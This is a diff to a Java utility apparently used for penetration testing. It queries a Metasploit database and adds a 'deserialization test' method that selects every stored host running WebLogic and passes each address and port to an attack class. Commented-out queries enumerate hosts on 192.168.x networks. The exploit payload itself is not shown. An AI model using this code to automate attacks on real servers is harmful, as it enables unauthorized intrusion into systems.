@@ -6,6 +6,7 @@ import java.util.Map;
 import java.util.TreeMap;
 
 import com.mtx.xiatian.hacker.CommonTools;
+import com.mtx.xiatian.hacker.MTX_AttackWeblogic;
 import com.sensepost.reDuh.Base64;
 /**<pre>
  * 查询metasploit-framework的数据库
@@ -327,6 +328,23 @@ name=URL-https://twitter.com/FuzzySec/status/723254004042612736}
 	}
 	
 	/**
+	 * 反序列化测试
+	 */
+	public void doWeblogicFxlh()
+	{
+		final MTX_AttackWeblogic ma = new MTX_AttackWeblogic();
+		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
+				{
+					public boolean add(TreeMap<String, Object> m)
+					{
+						ma.connSvr(String.valueOf(m.get("address")), String.valueOf(m.get("port")), null, null);
+						return true;
+					}
+				};
+				query("select b.address, a.port from services a, hosts b where b.id=a.host_id  and a.info like '%WebLogic%'", list);
+	}
+	
+	/**
 	 * @param args
 	 */
 	public static void main(String[] args)
@@ -345,6 +363,7 @@ name=URL-https://twitter.com/FuzzySec/status/723254004042612736}
 				return true;
 			}
 		};
+		msf.doWeblogicFxlh();
 //		msf.getAllServicesInfo();
 //		msf.getAllHostVerInfo(); // 192.168.2.1-192.168.10.142
 		// 
@@ -354,7 +373,7 @@ name=URL-https://twitter.com/FuzzySec/status/723254004042612736}
 //		 msf.query("select  os_name as czxt,count(1) as czxtcnt from hosts  where state='alive' and text(address) like '192.168.%'  group by os_name order by czxtcnt desc", list);
 //		msf.query("select  * from hosts  where state!='alive'", list);
 //		msf.query("select  info,count(1) a from  services where name='mysql' group by info order by a desc", list);
-//		msf.query("select *  from hosts where mac is null", list);
+//		msf.query("select  b.address, a.port from services a, hosts b where b.id=a.host_id  and a.info like '%WebLogic%'", list);
 //		msf.query("select k.name, count(1) zc from (select  b.address, a.name from services a, hosts b where b.os_name!='null' and b.os_name!='Unknown' and text(b.address) like '192.168.%' and b.workspace_id=2 and b.id=a.host_id and b.name!='null' group by b.address, a.name) as k group by k.name order by zc desc", list);
 //		msf.query("select  a.name, count(1) z from services a, hosts b where" +
 //				"  b.os_name!='null' and b.os_name!='Unknown' and text(b.address) like '192.168.%'" +
